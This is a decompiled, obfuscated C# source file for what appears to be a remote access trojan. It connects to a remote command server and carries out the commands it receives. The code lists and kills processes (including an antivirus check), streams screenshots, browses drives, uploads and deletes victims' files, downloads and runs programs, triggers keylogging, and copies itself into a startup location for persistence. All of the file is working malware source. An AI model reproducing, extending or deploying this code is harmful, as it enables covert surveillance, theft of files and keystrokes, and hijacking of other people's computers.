using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace rgiwsdasxa;

public class rgiwsdasxaMCDM
{
	public int port_sn = 0;

	private Dictionary<string, byte[]> rgiwsdasxatasks = new Dictionary<string, byte[]>();

	public DateTime rgiwsdasxarunTime;

	private int rgiwsdasxabytesRead = 0;

	public bool rgiwsdasxareqCnls = false;

	public bool rgiwsdasxaautCnls = false;

	public DateTime rgiwsdasxalTimeUtc;

	private rgiwsdasxaTHRE rgiwsdasxaStateObj = new rgiwsdasxaTHRE();

	private rgiwsdasxaMYINF rgiwsdasxaUPC;

	private rgiwsdasxaOCMD rgiwsdasxaCMD;

	private int rgiwsdasxascrSize = 200;

	private ThreadStart rgiwsdasxafunStarter;

	public TcpClient rgiwsdasxatcpsck;

	public NetworkStream rgiwsdasxanetStream;

	private int rgiwsdasxabuffSize = 1024;

	private rgiwsdasxaDRIVF rgiwsdasxaHD = new rgiwsdasxaDRIVF();

	public bool rgiwsdasxais_working = false;

	private bool rgiwsdasxaiswitch = false;

	private bool rgiwsdasxathrRuning = false;

	private bool rgiwsdasxastr_writer = false;

	private bool rgiwsdasxacapScreen = false;

	private Thread rgiwsdasxafunThread;

	public void rgiwsdasxado_start()
	{
		rgiwsdasxaCONF.rgiwsdasxaport = rgiwsdasxaCONF.ports[0];
		rgiwsdasxarunTime = DateTime.Now;
		rgiwsdasxaUPC = new rgiwsdasxaMYINF();
		rgiwsdasxaCMD = new rgiwsdasxaOCMD(this);
		rgiwsdasxaHD.iserver = this;
		rgiwsdasxaHD.rgiwsdasxamainPath = rgiwsdasxaCONF.rgiwsdasxaget_mpath();
		TimerCallback callback = rgiwsdasxalookup_connect;
		Timer rgiwsdasxatimer = new Timer(callback, rgiwsdasxaStateObj, 32110, 36110);
		rgiwsdasxaStateObj.rgiwsdasxatimer = rgiwsdasxatimer;
	}

	private void rgiwsdasxacheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(rgiwsdasxarunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				rgiwsdasxatcpsck.Close();
				rgiwsdasxais_working = false;
			}
		}
		catch
		{
		}
	}

	public string rgiwsdasxafile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|rgiwsdasxa".Split(new char[1] { '|' })[0] : "<|rgiwsdasxa".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|rgiwsdasxa".Split(new char[1] { '|' })[0] : "<|rgiwsdasxa".Split(new char[1] { '|' })[0]);
			text = text + rgiwsdasxaget_size(fileInfo.Length) + ((!ret) ? ">|rgiwsdasxa".Split(new char[1] { '|' })[0] : "<|rgiwsdasxa".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				rgiwsdasxapush_data(null, "rgiwsdasxa-filsz=|rgiwsdasxa".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void rgiwsdasxasaveFile(string filePath)
	{
		try
		{
			byte[] array = rgiwsdasxapull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private bool rgiwsdasxaIPSConfig()
	{
		try
		{
			rgiwsdasxaCONF.rgiwsdasxadefaultP = rgiwsdasxaCMD.rgiwsdasxaserverIPD();
			rgiwsdasxatcpsck = new TcpClient();
			rgiwsdasxatcpsck.Connect(rgiwsdasxaCONF.rgiwsdasxadefaultP, rgiwsdasxaCONF.rgiwsdasxaport);
			return true;
		}
		catch
		{
			rgiwsdasxaports_switch();
			return false;
		}
	}

	private void rgiwsdasxalookup_connect(object source)
	{
		try
		{
			if (!rgiwsdasxathrRuning)
			{
				rgiwsdasxathrRuning = true;
				rgiwsdasxacheckLastatime(DateTime.Now);
				if (!rgiwsdasxais_working || !rgiwsdasxatcpsck.Connected)
				{
					rgiwsdasxais_working = rgiwsdasxaIPSConfig();
					if (rgiwsdasxais_working)
					{
						rgiwsdasxabuffSize = rgiwsdasxatcpsck.ReceiveBufferSize;
						rgiwsdasxasee_responce();
					}
				}
			}
			rgiwsdasxathrRuning = false;
		}
		catch
		{
			rgiwsdasxathrRuning = false;
			rgiwsdasxastr_writer = false;
			rgiwsdasxais_working = false;
			rgiwsdasxaiswitch = false;
		}
	}

	public void rgiwsdasxaports_switch()
	{
		try
		{
			port_sn++;
			rgiwsdasxaCONF.rgiwsdasxaport = rgiwsdasxaCONF.ports[port_sn];
			if (port_sn >= rgiwsdasxaCONF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool rgiwsdasxasend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				rgiwsdasxapush_data(data, "rgiwsdasxa-afile=" + fileinfo);
				return false;
			}
			rgiwsdasxapush_data(null, "rgiwsdasxa-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void rgiwsdasxalist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
				text += "0>|rgiwsdasxa".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] byteArray = rgiwsdasxaCONF.getByteArray(text);
			rgiwsdasxapush_data(byteArray, "rgiwsdasxa-" + cmd + "=process|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void rgiwsdasxaload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = rgiwsdasxaCONF.rgiwsdasxaget_mpath() + rgiwsdasxaCONF.rgiwsdasxamainApp + ".exe|rgiwsdasxa".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			rgiwsdasxaCONF.rgiwsdasxaset_run("_migvs|rgiwsdasxa".Split(new char[1] { '|' })[0], rgiwsdasxaCONF.rgiwsdasxaget_mpath() + rgiwsdasxaCONF.rgiwsdasxamainApp + ".exe|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void rgiwsdasxaimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
				text = text + rgiwsdasxaget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				rgiwsdasxapush_data(memoryStream.ToArray(), "rgiwsdasxa-thumb=|rgiwsdasxa".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void rgiwsdasxasee_scren(string screenSize)
	{
		try
		{
			rgiwsdasxaSCRNS rgiwsdasxaSCRNS2 = new rgiwsdasxaSCRNS();
			rgiwsdasxascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = rgiwsdasxaSCRNS2.rgiwsdasxascreen(rgiwsdasxascrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				rgiwsdasxapush_data(memoryStream.ToArray(), "rgiwsdasxa-sascr=capreen|rgiwsdasxa".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void rgiwsdasxais_screen(string screenSize)
	{
		try
		{
			rgiwsdasxaSCRNS rgiwsdasxaSCRNS2 = new rgiwsdasxaSCRNS();
			rgiwsdasxascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (rgiwsdasxacapScreen && rgiwsdasxais_working)
			{
				Bitmap val = rgiwsdasxaSCRNS2.rgiwsdasxascreen(rgiwsdasxascrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					rgiwsdasxapush_data(memoryStream.ToArray(), "rgiwsdasxa-scren=capreen|rgiwsdasxa".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void rgiwsdasxauser_info()
	{
		string text = rgiwsdasxaUPC.rgiwsdasxalancard + "|" + rgiwsdasxaUPC.rgiwsdasxacname + "|" + rgiwsdasxaUPC.rgiwsdasxauname + "|" + rgiwsdasxaUPC.rgiwsdasxauip + "|" + rgiwsdasxaCONF.rgiwsdasxaOsname() + "|" + rgiwsdasxaUPC.rgiwsdasxaapver + "|";
		text += "| !rgiwsdasxa".Split(new char[1] { '!' })[0];
		text = text + "|" + rgiwsdasxaUPC.rgiwsdasxaclientNum;
		text = text + "|" + rgiwsdasxaCONF.rgiwsdasxaget_mpath();
		byte[] byteArray = rgiwsdasxaCONF.getByteArray(text);
		rgiwsdasxapush_data(byteArray, "rgiwsdasxa-info=user|rgiwsdasxa".Split(new char[1] { '|' })[0]);
	}

	private void rgiwsdasxascreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			rgiwsdasxascrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void rgiwsdasxapush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				rgiwsdasxapush_data(File.ReadAllBytes(lfile), "rgiwsdasxa-file=|rgiwsdasxa".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void rgiwsdasxaremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string rgiwsdasxaget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|rgiwsdasxa".Split(new char[1] { '|' })[0],
				"KB|rgiwsdasxa".Split(new char[1] { '|' })[0],
				"MB|rgiwsdasxa".Split(new char[1] { '|' })[0],
				"GB|rgiwsdasxa".Split(new char[1] { '|' })[0],
				"TB|rgiwsdasxa".Split(new char[1] { '|' })[0],
				"PB|rgiwsdasxa".Split(new char[1] { '|' })[0],
				"EB|rgiwsdasxa".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public string[] rgiwsdasxaget_command()
	{
		try
		{
			byte[] array = new byte[5];
			rgiwsdasxabytesRead = rgiwsdasxanetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= rgiwsdasxabytesRead)
			{
				int count = ((num3 > rgiwsdasxabuffSize) ? rgiwsdasxabuffSize : num3);
				rgiwsdasxabytesRead = rgiwsdasxanetStream.Read(array2, num2, count);
				num2 += rgiwsdasxabytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			rgiwsdasxais_working = false;
			return null;
		}
	}

	public byte[] rgiwsdasxapull_data()
	{
		try
		{
			rgiwsdasxarunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			rgiwsdasxabytesRead = rgiwsdasxanetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !rgiwsdasxareqCnls)
			{
				int count = ((num3 > rgiwsdasxabuffSize) ? rgiwsdasxabuffSize : num3);
				rgiwsdasxabytesRead = rgiwsdasxanetStream.Read(array2, num, count);
				num += rgiwsdasxabytesRead;
				num3 -= rgiwsdasxabytesRead;
				rgiwsdasxarunTime = DateTime.Now;
			}
			if (rgiwsdasxareqCnls)
			{
				rgiwsdasxanetStream.Flush();
				while (rgiwsdasxanetStream.DataAvailable && rgiwsdasxanetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			rgiwsdasxais_working = false;
			return null;
		}
	}

	private void rgiwsdasxalistDrives()
	{
		string text = rgiwsdasxaHD.rgiwsdasxalookupDrives();
		rgiwsdasxapush_data(null, "rgiwsdasxa-dirs=" + text);
	}

	private void rgiwsdasxasee_responce()
	{
		if (!rgiwsdasxaiswitch)
		{
			rgiwsdasxaiswitch = true;
			rgiwsdasxanetStream = rgiwsdasxaCMD.rgiwsdasxaNS(rgiwsdasxatcpsck);
			rgiwsdasxacapScreen = false;
			while (rgiwsdasxais_working)
			{
				string[] switchType = rgiwsdasxaget_command();
				if (switchType != null)
				{
					rgiwsdasxareqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("rgiwsdasxa-" + text) : ("rgiwsdasxa-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "rgiwsdasxa-procl":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxalist_processes("procl");
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-getavs":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxalist_processes("getavs");
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-thumb":
						rgiwsdasxaimage_info(switchType[1]);
						break;
					case "rgiwsdasxa-clping":
						rgiwsdasxarunTime = DateTime.Now;
						break;
					case "rgiwsdasxa-putsrt":
						rgiwsdasxaload_app();
						break;
					case "rgiwsdasxa-filsz":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxafile_info(switchType[1]);
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-rupth":
						rgiwsdasxapush_data(null, "rgiwsdasxa-appth=|rgiwsdasxa".Split(new char[1] { '|' })[0] + rgiwsdasxaCONF.rgiwsdasxaget_mpath());
						break;
					case "rgiwsdasxa-dowf":
						rgiwsdasxasaveFile(switchType[1]);
						break;
					case "rgiwsdasxa-endpo":
						try
						{
							try
							{
								Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
							}
							catch
							{
							}
						}
						catch
						{
						}
						break;
					case "rgiwsdasxa-scrsz":
						rgiwsdasxascreenSize(switchType[1]);
						break;
					case "rgiwsdasxa-cownar":
						rgiwsdasxaCMD.rgiwsdasxado_updated(7, switchType[1]);
						break;
					case "rgiwsdasxa-cscreen":
						rgiwsdasxasee_scren(switchType[1]);
						break;
					case "rgiwsdasxa-dirs":
						rgiwsdasxafunThread = new Thread(rgiwsdasxalistDrives);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-stops":
						rgiwsdasxacapScreen = false;
						break;
					case "rgiwsdasxa-scren":
						rgiwsdasxacapScreen = true;
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxais_screen(switchType[1]);
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-uklog":
						rgiwsdasxaCMD.rgiwsdasxado_updated(3, switchType[1]);
						break;
					case "rgiwsdasxa-cnls":
						rgiwsdasxaautCnls = true;
						rgiwsdasxareqCnls = true;
						rgiwsdasxacapScreen = false;
						break;
					case "rgiwsdasxa-udlt":
						rgiwsdasxaCMD.rgiwsdasxaremove_user();
						break;
					case "rgiwsdasxa-delt":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxaremove_file(switchType[1]);
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-afile":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxasend_auto(switchType[1]);
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-listf":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxaHD.rgiwsdasxalookFiles(switchType[1]);
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-file":
						rgiwsdasxafunStarter = delegate
						{
							rgiwsdasxapush_file(switchType[1]);
						};
						rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-info":
						rgiwsdasxafunThread = new Thread(rgiwsdasxauser_info);
						rgiwsdasxafunThread.Start();
						break;
					case "rgiwsdasxa-runf":
						rgiwsdasxaCMD.rgiwsdasxado_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "rgiwsdasxa-fles":
					{
						string files = rgiwsdasxaHD.rgiwsdasxalookupFiles(switchType[1]);
						if (files != null)
						{
							rgiwsdasxafunStarter = delegate
							{
								rgiwsdasxapush_data(null, "rgiwsdasxa-fles=|rgiwsdasxa".Split(new char[1] { '|' })[0] + files);
							};
							rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
							rgiwsdasxafunThread.Start();
						}
						break;
					}
					case "rgiwsdasxa-dowr":
						rgiwsdasxasaveFile(switchType[1]);
						break;
					case "rgiwsdasxa-fldr":
					{
						string Folders = rgiwsdasxaHD.rgiwsdasxacheckFolders(switchType[1]);
						if (Folders != null)
						{
							rgiwsdasxafunStarter = delegate
							{
								rgiwsdasxapush_data(null, "rgiwsdasxa-fldr=|rgiwsdasxa".Split(new char[1] { '|' })[0] + Folders);
							};
							rgiwsdasxafunThread = new Thread(rgiwsdasxafunStarter);
							rgiwsdasxafunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				rgiwsdasxais_working = false;
				break;
			}
			rgiwsdasxais_working = false;
			rgiwsdasxacapScreen = false;
		}
		rgiwsdasxaiswitch = false;
	}

	public bool rgiwsdasxapush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			rgiwsdasxarunTime = DateTime.Now;
			if (rgiwsdasxastr_writer)
			{
				return false;
			}
			rgiwsdasxastr_writer = true;
			byte[] byteArray = rgiwsdasxaCONF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !rgiwsdasxareqCnls)
			{
				int num5 = ((num4 > rgiwsdasxabuffSize) ? rgiwsdasxabuffSize : num4);
				rgiwsdasxanetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				rgiwsdasxarunTime = DateTime.Now;
			}
			rgiwsdasxastr_writer = false;
			if (rgiwsdasxareqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			rgiwsdasxastr_writer = false;
			rgiwsdasxais_working = false;
			return false;
		}
	}
}
